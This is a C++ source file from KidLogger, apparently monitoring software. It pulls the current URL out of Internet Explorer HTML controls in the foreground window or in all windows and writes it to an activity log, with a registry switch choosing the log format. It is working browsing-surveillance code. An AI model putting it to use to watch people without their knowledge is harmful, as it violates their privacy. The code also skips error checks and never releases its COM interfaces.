
#include "stdafx.h"
//#include "HTMLDump.h"
#include "globalfunction.h"
#include "../hooks/hooks.h"
#include "hashverf.h"

#define USE_TOP_WINDOW

HASHV hashv;

LPFNOBJECTFROMLRESULT pfObjectFromLresult	=	NULL;

HRESULT	get_ihtml(HWND hWnd, IHTMLDocument2** ppHTMLDoc2)
{
	DWORD lRes	=	0;
	HRESULT hr;
	
	static UINT MSG = RegisterWindowMessage(_T("WM_HTML_GETOBJECT"));
	SendMessageTimeout(hWnd, MSG, 0, 0, SMTO_ABORTIFHUNG, 1000, &lRes);
	
	hr	=	(*pfObjectFromLresult)(lRes,IID_IHTMLDocument2,0,(void**)ppHTMLDoc2);

	return hr;
}

HRESULT get_ihtml_url(IHTMLDocument2* pHTMLDoc2, BSTR *pUrl)
{
	if(pHTMLDoc2==NULL)
		return E_INVALIDARG;
	
	HRESULT	hr = pHTMLDoc2->get_URL(pUrl);
	return hr;	
}

IHTMLDocument2 *ihtml;

CString last_url;

/** Scan all SUB-windows to get HTML control.
*/
BOOL CALLBACK enum_proc(HWND hwnd,  LPARAM lp)
{
	char buf[32];
	BSTR url;
	if(!hwnd)
		return 0;

	GetClassName(hwnd,buf,32);

	if(strstr(buf,"Explorer_Server"))
	{
		get_ihtml(hwnd,&ihtml);
		get_ihtml_url(ihtml,&url);
		
		CString curl(url);
		
		if(!hashv.verf_and_add(curl, curl.GetLength()))
		//if ( curl != last_url)
		{
			last_url = curl;
			if ( 1 == ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "SafeLogger", 0) ) 
			{
				AddLOG_message( (LPTSTR)(LPCTSTR)curl, 0, 0);
			} else {
				AddLOG_message( (LPTSTR)(LPCTSTR) ("\r\n<br><br>[URL] <a href=\""+curl+"\">"+curl + "</a><br>\r\n"), 0, 0);

			}
		}
		
		SysFreeString(url); 		
		return 1; 
	}
	if(lp)
		EnumChildWindows(hwnd,enum_proc,0);
	return 1;
}


/** Scan All windows or Get the active window.
*/
void dump_urls_to_log()
{
	if(pfObjectFromLresult)
	{
#ifndef USE_TOP_WINDOW
		EnumWindows(enum_proc,1);
#else
		enum_proc(GetForegroundWindow(),1);		
#endif
	}
}